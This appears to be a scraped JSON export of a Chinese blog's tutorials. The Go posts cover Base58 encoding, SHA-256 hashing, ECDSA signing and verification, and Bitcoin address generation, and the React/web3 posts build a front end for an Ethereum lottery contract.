123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package mainimport ( \"crypto/sha256\" \"golang.org/x/crypto/ripemd160\" \"fmt\" \"math/big\" \"encoding/hex\")//base58编码var b58Alphabet = []byte(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\")func Base58Encode(input []byte) []byte&#123; var result []byte x:= big.NewInt(0).SetBytes(input) base := big.NewInt(int64(len(b58Alphabet))) zero := big.NewInt(0) mod := &amp;big.Int&#123;&#125; for x.Cmp(zero) != 0 &#123; x.DivMod(x,base,mod) // 对x取余数 result = append(result, b58Alphabet[mod.Int64()]) &#125; ReverseBytes(result) for _,b:=range input&#123; if b ==0x00&#123; result = append([]byte&#123;b58Alphabet[0]&#125;,result...) &#125;else&#123; break &#125; &#125; return result&#125;//字节数组的反转func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;//产生比特币地址func generateAddress(pubkey []byte) []byte&#123; //1、计算pubkeuhash pubkeyHash256 :=sha256.Sum256(pubkey) PIPEMD160Hasher := ripemd160.New() _,err:= PIPEMD160Hasher.Write(pubkeyHash256[:]) if err!=nil&#123; fmt.Println(\"error\") &#125; publicRIPEMD160 := PIPEMD160Hasher.Sum(nil) //2、计算checksum versionPayload := append([]byte&#123;0x00&#125;,publicRIPEMD160...) firstSHA := sha256.Sum256(versionPayload) secondSHA := sha256.Sum256(firstSHA[:]) //checksum 是前面的4个字节 checksum:=secondSHA[:4] //3、base58编码 fullPayload := append(versionPayload,checksum...)//返回地址 address:=Base58Encode(fullPayload) return address&#125;func main()&#123; //外部得到公钥 publickpey,_:=hex.DecodeString(\"D4A6C78C0B13DBD8A07AAB17C7D79ED9CB2523B63EDAC4E7CACE93C6B66CEDC7918EE0E174E8B2B61468D0E6CAA099710EF72094ACBD70BDAE3D8E42C617ACC6\") //fmt.Printf(\"%X\",publickpey)//打印这个地址 address:=generateAddress(publickpey) fmt.Printf(\"%s\",address)&#125; 参考资料 Building Blockchain in Go. Part 5: Addresses 比特币公钥转地址工具 地址：比特币维基百科","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[37]-区块链-验证数据签名","slug":"golang-37-blockchain-verifysign","date":"2018-12-07T03:53:24.000Z","updated":"2019-02-04T08:32:46.352Z","comments":true,"path":"2018/12/07/golang-37-blockchain-verifysign/","link":"","permalink":"https://dreamerjonson.com/2018/12/07/golang-37-blockchain-verifysign/","excerpt":"","text":"验证数据签名 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package mainimport ( \"crypto/ecdsa\" \"crypto/rand\" \"crypto/sha256\" \"crypto/elliptic\" \"log\" \"fmt\" \"math/big\")//生成私钥和公钥，生成的私钥为结构体ecdsa.PrivateKey的指针//type PrivateKey struct &#123;// PublicKey// D *big.Int//&#125;func newKeyPair3() (ecdsa.PrivateKey, []byte) &#123; //生成secp256k1椭圆曲线 curve := elliptic.P256() //产生的是一个结构体指针，结构体类型为ecdsa.PrivateKey private, err := ecdsa.GenerateKey(curve, rand.Reader) if err != nil &#123; log.Panic(err) &#125; //x坐标与y坐标拼接在一起，生成公钥 pubKey := append(private.PublicKey.X.Bytes(), private.PublicKey.Y.Bytes()...) return *private, pubKey&#125;func main()&#123; //生成公钥要私钥 privKey,pubkey := newKeyPair3() //生成某一串信息的哈希值，需要签名的数据 hash := sha256.Sum256([]byte(\"跟着jonson老师实战区块链\\n\")) //根据私钥和信息的哈希值生成数字签名的r和s，r和s拼接在一起就是数字签名，在这里省略了拼接的步骤，欲查看，请看3.数字签名 r, s, _ := ecdsa.Sign(rand.Reader, &amp;privKey, hash[:]) //fmt.Printf(\"%v\\n\", *r) //fmt.Printf(\"%v\\n\", *s) ////生成secp256k1椭圆曲线 curve := elliptic.P256() //公钥的长度 keyLen := len(pubkey) //前一半为x轴坐标，后一半为y轴坐标 x := big.Int&#123;&#125; y := big.Int&#123;&#125; x.SetBytes(pubkey[:(keyLen / 2)]) y.SetBytes(pubkey[(keyLen / 2):]) //rawPubKey为生成PublicKey结构体，作为下面ecdsa.Verify的参数 //type PublicKey struct &#123; // elliptic.Curve // X, Y * big.Int &#125; //公钥 rawPubKey := ecdsa.PublicKey&#123;curve, &amp;x, &amp;y&#125; //根据交易哈希、公钥、数字签名验证成功。ecdsa.Verify func Verify(pub *PublicKey, hash []byte, r *big.Int, s *big.Int) bool if ecdsa.Verify(&amp;rawPubKey, hash[:], r, s) == false &#123; fmt.Printf(\"%s\\n\", \"验证失败\") &#125;else&#123; fmt.Printf(\"%s\\n\", \"验证成功\") &#125; //用其他的信息哈希——证明验证失败 hash2 := sha256.Sum256([]byte(\"我要给你200愿\\n\")) if ecdsa.Verify(&amp;rawPubKey, hash2[:], r, s) == false &#123; fmt.Printf(\"%s\\n\", \"验证失败\") &#125;else&#123; fmt.Printf(\"%s\\n\", \"验证成功\") &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[36]-区块链-数据签名生成","slug":"golang-36-blockchain-signature","date":"2018-12-07T03:47:58.000Z","updated":"2019-02-04T08:32:41.726Z","comments":true,"path":"2018/12/07/golang-36-blockchain-signature/","link":"","permalink":"https://dreamerjonson.com/2018/12/07/golang-36-blockchain-signature/","excerpt":"","text":"区块链-数据签名生成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( \"crypto/ecdsa\" \"crypto/rand\" \"crypto/sha256\" \"crypto/elliptic\" \"log\" \"fmt\")//生成私钥和公钥，生成的私钥为结构体ecdsa.PrivateKey的指针//type PrivateKey struct &#123;// PublicKey// D *big.Int//&#125;func newKeyPair2() (ecdsa.PrivateKey, []byte) &#123; //生成secp256k1椭圆曲线 curve := elliptic.P256() //产生的是一个结构体指针，结构体类型为ecdsa.PrivateKey private, err := ecdsa.GenerateKey(curve, rand.Reader) if err != nil &#123; log.Panic(err) &#125; //x坐标与y坐标拼接在一起，生成公钥 pubKey := append(private.PublicKey.X.Bytes(), private.PublicKey.Y.Bytes()...) return *private, pubKey&#125;func main()&#123; //调用函数生成私钥与公钥 privKey,_ := newKeyPair2() //信息的哈希,签名什么样的数据 hash := sha256.Sum256([]byte(\"hello world\\n\")) //根据私钥和信息的哈希进行数字签名，产生r和s r, s, err := ecdsa.Sign(rand.Reader, &amp;privKey, hash[:]) if err != nil &#123; log.Panic(err) &#125; //r和s拼接在一起实现了数字签名 signature := append(r.Bytes(), s.Bytes()...) //打印数字签名的16进制显示 fmt.Printf(\"%x\\n\", signature) fmt.Printf(\"%x\\n\", r.Bytes()) fmt.Printf(\"%x\\n\", s.Bytes()) //补充：如何把一个字符串转换为16进制数据 //m := big.Int&#123;&#125; //n := big.Int&#123;&#125; //rr,_:=hex.DecodeString(\"7dccc0f58639584a3f0c879c3688d2f4a0137697cbf34245d075c764e36233d2\") //ss,_:=hex.DecodeString(\"cf3713bf4369eb1c02e476cdbefb7f76a25b572f53fb71d4e4742fa11c827526\") // //m.SetBytes(rr) //n.SetBytes(ss) // //fmt.Printf(\"%x\\n\", m.Bytes()) //fmt.Printf(\"%x\\n\", n.Bytes())&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[35]-区块链-私钥公钥生成","slug":"golang-35-blockchain-publickey","date":"2018-12-07T02:36:24.000Z","updated":"2019-02-04T08:32:37.261Z","comments":true,"path":"2018/12/07/golang-35-blockchain-publickey/","link":"","permalink":"https://dreamerjonson.com/2018/12/07/golang-35-blockchain-publickey/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132//生成私钥和公钥func newKeyPair() (ecdsa.PrivateKey,[]byte)&#123; //生成椭圆曲线, secp256r1 曲线。 比特币当中的曲线是secp256k1 curve :=elliptic.P256() private,err :=ecdsa.GenerateKey(curve,rand.Reader) if err !=nil&#123; fmt.Println(\"error\") &#125; pubkey :=append(private.PublicKey.X.Bytes(),private.PublicKey.Y.Bytes()...) return *private,pubkey&#125;func main()&#123;//调用函数生成公钥privatekey,public :=newKeyPair()//打印私钥 曲线上的x点 fmt.Printf(\"%x\\n\",privatekey.D.Bytes())//打印公钥， 曲线上的x点和y点fmt.Printf(\"%x\",public)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[34]-区块链-对称加密与非对称加密","slug":"golang-34-blockchain-privatekey","date":"2018-12-07T01:55:02.000Z","updated":"2019-02-04T08:32:32.774Z","comments":true,"path":"2018/12/07/golang-34-blockchain-privatekey/","link":"","permalink":"https://dreamerjonson.com/2018/12/07/golang-34-blockchain-privatekey/","excerpt":"","text":"对称加密 对称密钥加密（英语：Symmetric-key algorithm）又称为对称加密、私钥加密、共享密钥加密，是密码学中的一类加密算法。这类算法在加密和解密时使用相同的密钥，或是使用两个可以简单地相互推算的密钥。事实上，这组密钥成为在两个或多个成员间的共同秘密，以便维持专属的通信联系。与公开密钥加密相比，要求双方获取相同的密钥是对称密钥加密的主要缺点之一。 常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6。 对称加密的速度比公钥加密快很多，在很多场合都需要对称加密。 非对称加密 公开密钥加密（英语：Public-key cryptography），也称为非对称加密（英语：asymmetric cryptography），是密码学的一种算法，它需要两个密钥，一个是公开密钥，另一个是私有密钥；一个用作加密的时候，另一个则用作解密。使用其中一个密钥把明文加密后所得的密文，只能用相对应的另一个密钥才能解密得到原本的明文；甚至连最初用来加密的密钥也不能用作解密。由于加密和解密需要两个不同的密钥，故被称为非对称加密；不同于加密和解密都使用同一个密钥的对称加密。虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个；因此其中一个可以公开，称为公钥，任意向外发布；不公开的密钥为私钥，必须由用户自行严格秘密保管，绝不透过任何途径向任何人提供，也不会透露给要通信的另一方，即使他被信任。 基于公开密钥加密的特性，它还提供数字签名的功能，使电子文件可以得到如同在纸本文件上亲笔签署的效果。 公开密钥基础建设透过信任数字证书认证机构的根证书、及其使用公开密钥加密作数字签名核发的公开密钥认证，形成信任链架构，已在TLS实现并在万维网的HTTP以HTTPS、在电子邮件的SMTP以STARTTLS引入。 非对称加密过程 在数学上，d(c(x))=x，让我们使用典型的爱丽丝与鲍伯假设来解释： 爱丽丝与鲍伯事先互不认识，也没有可靠安全的沟通渠道，但爱丽丝现在却要透过不安全的互联网向鲍伯发送信息 爱丽丝撰写好原文，原文在未加密的状态下称之为明文 x 鲍伯使用密码学安全伪随机数生成器产生一对密钥，其中一个作为公钥为 c，另一个作为私钥 d 鲍伯可以用任何方法发送公钥c 给爱丽丝，即使伊夫在中间窃听到 c 也没问题 爱丽丝用公钥c 把明文 x 进行加密，得到密文c(x) 爱丽丝可以用任何方法传输密文c(x) 给鲍伯，即使伊夫在中间窃听到密文 c(x)也没问题 鲍伯收到密文，用私钥d 对密文进行解密 d(c(x))，得到爱丽丝撰写的明文x 由于伊夫没有得到鲍伯的私钥d，所以无法得知明文 x 如果爱丽丝丢失了她自己撰写的原文x，在没有得到鲍伯的私钥d 的情况下，她的处境将等同伊夫，即无法透过鲍伯的公钥c 和密文c(x)重新得到原文x 对比 对称密钥加密牵涉到密钥管理的问题，尤其是密钥交换，它需要作者和读者在通信之前先透过另一个安全的渠道交换共享的密钥，才可以安全地把密文透过不安全的渠道发送；对称密钥一旦被窃，其所作的加密将即时失效；而在互联网，如果通信双方分隔异地而素未谋面，则对称加密事先所需要的“安全渠道”变得不可行；非对称加密则容许加密公钥随便散布，解密的私钥不发往任何用户，只在单方保管；如此，即使公钥在网上被截获，如果没有与其匹配的私钥，也无法解密，极为适合在互联网上使用。 另一方面，公钥解密的特性可以形成数字签名，使数据和文件受到保护并可信赖；如果公钥透过数字证书认证机构签授成为电子证书，更可作为数字身份的认证，这都是对称密钥加密无法实现的。 不过，公钥加密在在计算上相当复杂，性能欠佳、远远不比对称加密；因此，在一般实际情况下，往往通过公钥加密来随机创建临时的对称秘钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[33]-区块链-hash","slug":"golang-33-blockchain-hash","date":"2018-12-05T09:48:18.000Z","updated":"2019-02-04T08:32:27.329Z","comments":true,"path":"2018/12/05/golang-33-blockchain-hash/","link":"","permalink":"https://dreamerjonson.com/2018/12/05/golang-33-blockchain-hash/","excerpt":"","text":"哈希函数有三个特点： 输入无限的字符会输出给我们固定长度的字符（即便是图书馆里面所有的数据） 输入的函数的微小变化最后都会带来哈希函数返回值的巨大变化。 哈希函数的特点是不能根据哈希函数的返回值倒推出我们输入的数据是什么。同样的，我们在计算哈希函数之前，也不能够判断出数据回输出什么样的哈希值。 用途 数字指纹 数字签名 数字防篡改 go实现hash 123456789101112131415161718192021222324252627func main()&#123; //第一种方式 sum:= sha256.Sum256([]byte(\"jonson love olaya\")) fmt.Printf(\"%X\",sum) //第2种方式 h:=sha256.New() h.Write([]byte(\"jonson love olaya\")) fmt.Printf(\"%X\",h.Sum(nil))&#125;//第3种方式:处理文件 h:=sha256.New() f,err := os.Open(\"hash.test\") if err !=nil&#123; fmt.Printf(\"error\") &#125; defer f.Close() if _,err := io.Copy(h,f);err !=nil&#123; fmt.Printf(\"error\") &#125; fmt.Printf(\"%X\",h.Sum(nil)) 参考资料 https://golang.org/pkg/crypto/sha256/#example_Sum256","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[32]-区块链-base58","slug":"golang-32-base58","date":"2018-12-05T03:03:56.000Z","updated":"2019-02-04T08:32:21.122Z","comments":true,"path":"2018/12/05/golang-32-base58/","link":"","permalink":"https://dreamerjonson.com/2018/12/05/golang-32-base58/","excerpt":"","text":"base58 Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。相比Base64，Base58不使用数字&quot;0&quot;，字母大写&quot;O&quot;，字母大写&quot;I&quot;，和字母小写&quot;l&quot;，以及&quot;+“和”/&quot;符号。 设计Base58主要的目的是： 避免混淆。在某些字体下，数字0和字母大写O，以及字母大写I和字母小写l会非常相似。 不使用&quot;+“和”/&quot;的原因是非字母或数字的字符串作为帐号较难被接受。 没有标点符号，通常不会被从中间分行。 大部分的软件支持双击选择整个字符串。 base58编码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package mainimport ( \"math/big\" \"fmt\")//切片存储base58字母var b58Alphabet = []byte(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\")func Base58Encode(input []byte) []byte&#123;//定义一个字节切片，返回值 var result []byte//把字节数组input转化为了大整数big.Int x:= big.NewInt(0).SetBytes(input)//长度58的大整数 base := big.NewInt(int64(len(b58Alphabet))) //0的大整数 zero := big.NewInt(0)//大整数的指针 mod := &amp;big.Int&#123;&#125; //循环，不停地对x取余数,大小为58 for x.Cmp(zero) != 0 &#123; x.DivMod(x,base,mod) // 对x取余数 //讲余数添加到数组当中 result = append(result, b58Alphabet[mod.Int64()]) &#125;//反转字节数组 ReverseBytes(result)//如果这个字节数组的前面为字节0，会把它替换为1.for _,b:=range input&#123; if b ==0x00&#123; result = append([]byte&#123;b58Alphabet[0]&#125;,result...) &#125;else&#123; break &#125; &#125; return result&#125;//反转字节数组func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;//测试 反转操作func main()&#123; org := []byte(\"qwerty\") fmt.Println(string(org)) ReverseBytes(org) fmt.Println(string(org))//测试编码 fmt.Printf(\"%s\",string( Base58Encode([]byte(\"hello jonson\"))))&#125; 解码 12345678910111213141516171819202122232425262728func Base58Decode(input []byte) []byte&#123; result := big.NewInt(0) zeroBytes :=0 for _,b :=range input&#123; if b=='1'&#123; zeroBytes++ &#125;else&#123; break &#125; &#125; payload:= input[zeroBytes:] for _,b := range payload&#123; charIndex := bytes.IndexByte(b58Alphabet,b) //反推出余数 result.Mul(result,big.NewInt(58)) //之前的结果乘以58 result.Add(result,big.NewInt(int64(charIndex))) //加上这个余数 &#125; decoded :=result.Bytes() decoded = append(bytes.Repeat([]byte&#123;0x00&#125;,zeroBytes),decoded...) return decoded&#125; 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package mainimport ( \"math/big\" \"fmt\" \"bytes\")var b58Alphabet = []byte(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\")func Base58Encode(input []byte) []byte&#123; var result []byte x:= big.NewInt(0).SetBytes(input) base := big.NewInt(int64(len(b58Alphabet))) zero := big.NewInt(0) mod := &amp;big.Int&#123;&#125; for x.Cmp(zero) != 0 &#123; x.DivMod(x,base,mod) // 对x取余数 result = append(result, b58Alphabet[mod.Int64()]) &#125; ReverseBytes(result) for _,b:=range input&#123; if b ==0x00&#123; result = append([]byte&#123;b58Alphabet[0]&#125;,result...) &#125;else&#123; break &#125; &#125; return result&#125;func Base58Decode(input []byte) []byte&#123; result := big.NewInt(0) zeroBytes :=0 for _,b :=range input&#123; if b=='1'&#123; zeroBytes++ &#125;else&#123; break &#125; &#125; payload:= input[zeroBytes:] for _,b := range payload&#123; charIndex := bytes.IndexByte(b58Alphabet,b) //反推出余数 result.Mul(result,big.NewInt(58)) //之前的结果乘以58 result.Add(result,big.NewInt(int64(charIndex))) //加上这个余数 &#125; decoded :=result.Bytes() decoded = append(bytes.Repeat([]byte&#123;0x00&#125;,zeroBytes),decoded...) return decoded&#125;func ReverseBytes(data []byte)&#123; for i,j :=0,len(data) - 1;i&lt;j;i,j = i+1,j - 1&#123; data[i],data[j] = data[j],data[i] &#125;&#125;func main()&#123; org := []byte(\"qwerty\") fmt.Println(string(org)) ReverseBytes(org) fmt.Println(string(org)) fmt.Printf(\"%s\\n\",string( Base58Encode([]byte(\"hello jonson\")))) fmt.Printf(\"%s\",string(Base58Decode([]byte(\"2yGEbwRFyav6CimZ7\"))))&#125; 参考资料 (比特币wiki-base58编码)[https://en.bitcoin.it/wiki/Base58Check_encoding#Version_bytes] (维基百科-base58编码)[https://zh.wikipedia.org/wiki/Base58]","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"以太坊DAPP[5]-博彩-事件处理","slug":"solidity-64-lottery-project-button-submit","date":"2018-12-02T01:42:14.000Z","updated":"2018-12-02T02:12:15.363Z","comments":true,"path":"2018/12/02/solidity-64-lottery-project-button-submit/","link":"","permalink":"https://dreamerjonson.com/2018/12/02/solidity-64-lottery-project-button-submit/","excerpt":"","text":"处理按钮的提交事件： 处理了玩家入场的按钮与开始博彩的按钮。 处理按钮提交事件。如果当前的操作没有问题，会打开metamask来进行事务提交。 同时要注意的是，增加了信息提示，即如果当前交易一直在等待矿工交易确认，那么，那么就会提示等待交易完成。当交易完成后，state状态改变、从新tijiaorender。 会提示交易完成。 src/App.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import React, &#123; Component &#125; from 'react';import logo from './logo.svg';import './App.css';import web3 from './web3';import lottery from './lottery';class App extends Component &#123; state = &#123; manager:'', players:[], balance:'', value:'', message:'' &#125; async componentDidMount()&#123; const manager = await lottery.methods.manager().call(); const players = await lottery.methods.getPlayers().call(); const balance = await web3.eth.getBalance(lottery.options.address); this.setState(&#123;manager,players,balance&#125;); &#125; onSubmit = async event =&gt;&#123; event.preventDefault(); const accounts = await web3.eth.getAccounts(); this.setState(&#123;message:'等待交易完成.....'&#125;); await lottery.methods.enetr().send(&#123;from:accounts[0],value:web3.utils.toWei(this.state.value,'ether')&#125;); this.setState(&#123;message:'入场成功.....'&#125;); &#125; onClick = async ()=&gt;&#123; const accounts = await web3.eth.getAccounts(); this.setState(&#123;message:'等待交易完成......'&#125;); await lottery.methods.pickwiner().send(&#123;from:accounts[0]&#125;); this.setState(&#123;message:'赢家产生'&#125;); &#125; render() &#123; //console.log(web3.version); console.log(this.state.value); return ( &lt;div&gt; &lt;h1&gt;lottery管理者地址：&lt;/h1&gt; &lt;p&gt;this is manager by &#123;this.state.manager&#125;&lt;/p&gt; &lt;p&gt;当前的参与者的数量： &#123;this.state.players.length&#125;&lt;/p&gt; &lt;p&gt;当前资金池：&#123;web3.utils.fromWei(this.state.balance,'ether')&#125; ether&lt;/p&gt; &lt;hr/&gt; &lt;form onSubmit=&#123;this.onSubmit&#125;&gt; &lt;h4&gt;参与到博彩项目？&lt;/h4&gt; &lt;div&gt; &lt;label&gt;你想参与的金额：&lt;/label&gt; &lt;input value=&#123;this.state.value&#125; onChange=&#123;event=&gt;&#123;this.setState(&#123;value:event.target.value&#125;)&#125;&#125; /&gt; &lt;/div&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;hr/&gt; &lt;h4&gt;判断输赢&lt;/h4&gt; &lt;button onClick=&#123;this.onClick&#125;&gt;开始博彩&lt;/button&gt; &lt;p&gt;&#123;this.state.message&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125;export default App;","categories":[{"name":"DAPP","slug":"DAPP","permalink":"https://dreamerjonson.com/categories/DAPP/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"以太坊DAPP[4]-博彩-前台展示界面","slug":"solidity-63-lottery-project-show-page","date":"2018-12-02T01:18:14.000Z","updated":"2018-12-02T02:12:19.470Z","comments":true,"path":"2018/12/02/solidity-63-lottery-project-show-page/","link":"","permalink":"https://dreamerjonson.com/2018/12/02/solidity-63-lottery-project-show-page/","excerpt":"","text":"前台页面展示 在下面的展示中，展示了管理者的地址，当前参与者的数量、当前的资金池以及玩家入场按钮与判断输赢的按钮。将玩家列表、总资金、输入框信息都存储在了state状态变量中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import React, &#123; Component &#125; from 'react';import logo from './logo.svg';import './App.css';import web3 from './web3';import lottery from './lottery';class App extends Component &#123; state = &#123; manager:'', players:[], balance:'', value:'', &#125; async componentDidMount()&#123; const manager = await lottery.methods.manager().call(); const players = await lottery.methods.getPlayers().call(); const balance = await web3.eth.getBalance(lottery.options.address); this.setState(&#123;manager,players,balance&#125;); &#125; render() &#123; //console.log(web3.version); // console.log(this.state.value); return ( &lt;div&gt; &lt;h1&gt;lottery管理者地址：&lt;/h1&gt; &lt;p&gt;this is manager by &#123;this.state.manager&#125;&lt;/p&gt; &lt;p&gt;当前的参与者的数量： &#123;this.state.players.length&#125;&lt;/p&gt; &lt;p&gt;当前资金池：&#123;web3.utils.fromWei(this.state.balance,'ether')&#125; ether&lt;/p&gt; &lt;hr/&gt; &lt;form&gt; &lt;h4&gt;参与到博彩项目？&lt;/h4&gt; &lt;div&gt; &lt;label&gt;你想参与的金额：&lt;/label&gt; &lt;input value=&#123;this.state.value&#125; onChange=&#123;event=&gt;&#123;this.setState(&#123;value:event.target.value&#125;)&#125;&#125; /&gt; &lt;/div&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;hr/&gt; &lt;h4&gt;判断输赢&lt;/h4&gt; &lt;button&gt;开始博彩&lt;/button&gt; &lt;p&gt;&#123;this.state.message&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125;export default App;","categories":[{"name":"DAPP","slug":"DAPP","permalink":"https://dreamerjonson.com/categories/DAPP/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"以太坊DAPP[3]-博彩-react特性与博彩合约实例","slug":"solidity-62-lottery-project-react-state-manager","date":"2018-12-02T01:04:12.000Z","updated":"2018-12-02T02:12:23.357Z","comments":true,"path":"2018/12/02/solidity-62-lottery-project-react-state-manager/","link":"","permalink":"https://dreamerjonson.com/2018/12/02/solidity-62-lottery-project-react-state-manager/","excerpt":"","text":"博彩实例 在之前的课程中，我们介绍了如何编译与部署合约。现在，我们假设已经把合约部署到了ropsten的网络之上。得到了地址。 现在，我们需要通过合约的ABI接口与地址来构建博彩合约的实例。 新建文件：src/lottery.js: 1234567import web3 from './web3';const address = '0x94A261B507c4388f2ADcFfaA5685ffdF53ebcba5';const abi = [&#123;\"constant\":true,\"inputs\":[],\"name\":\"manager\",\"outputs\":[&#123;\"name\":\"\",\"type\":\"address\"&#125;],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"constant\":false,\"inputs\":[],\"name\":\"getPlayers\",\"outputs\":[&#123;\"name\":\"\",\"type\":\"address[]\"&#125;],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"&#125;,&#123;\"constant\":false,\"inputs\":[],\"name\":\"enetr\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"&#125;,&#123;\"constant\":false,\"inputs\":[],\"name\":\"pickwiner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"&#125;,&#123;\"constant\":true,\"inputs\":[&#123;\"name\":\"\",\"type\":\"uint256\"&#125;],\"name\":\"players\",\"outputs\":[&#123;\"name\":\"\",\"type\":\"address\"&#125;],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"&#125;];export default new web3.eth.Contract(abi,address); src/App.js: componentDidMount为react class的生命周期函数，其在reander之后执行。state是react中特殊的属性，其只是存在于class component中，用于存储属性。 当state中的状态变化之后，都会重新的执行reander函数，从而让页面展现出不同的效果。下面获取了管理者的地址并存储在了state状态变量中。在页面中显示了管理者的地址。 1234567891011121314151617181920212223242526272829import React, &#123; Component &#125; from 'react';import logo from './logo.svg';import './App.css';import web3 from './web3';import lottery from './lottery';class App extends Component &#123; state = &#123; manager:'', &#125; async componentDidMount()&#123; const manager = await lottery.methods.manager().call(); this.setState(&#123;manager&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h1&gt;lottery管理者地址：&lt;/h1&gt; &lt;p&gt;this is manager by &#123;this.state.manager&#125;&lt;/p&gt; &lt;/div&gt; ); &#125;&#125;export default App;","categories":[{"name":"DAPP","slug":"DAPP","permalink":"https://dreamerjonson.com/categories/DAPP/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"},{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/tags/nodejs/"}]},{"title":"以太坊DAPP[2]-博彩-react框架与web3实例","slug":"solidity-61-lottery-project-create-react-app","date":"2018-12-01T16:19:50.000Z","updated":"2018-12-02T02:12:28.002Z","comments":true,"path":"2018/12/02/solidity-61-lottery-project-create-react-app/","link":"","permalink":"https://dreamerjonson.com/2018/12/02/solidity-61-lottery-project-create-react-app/","excerpt":"","text":"安装React create-react-app 可以为我们新建一个模版react项目。让我们非常方便的使用到React。 123&gt; npm install -g create-react-app&gt; create-react-app lotterydemo&gt; npm start //自动打开localhost:3000 看到react界面 web3实例 新建 src/web3.js 在这里使用到了浏览器中内置的provider，在这里默认用户安装了metamask，因为metamask会内置web3j和provider到浏览器中。但是metamask内置的web3j库是0.20版本的。我们希望使用到罪行的1.0版本的web3j。同时使用到metamask提供的provider。 123import Web3 from 'web3';const web3 = new Web3(window.web3.currentProvider);export default web3; app.js: 在浏览器打印出，web3的版本为1.0.0@beta36 12345import web3 from &apos;./web3&apos;;render() &#123; console.log(web3.version); 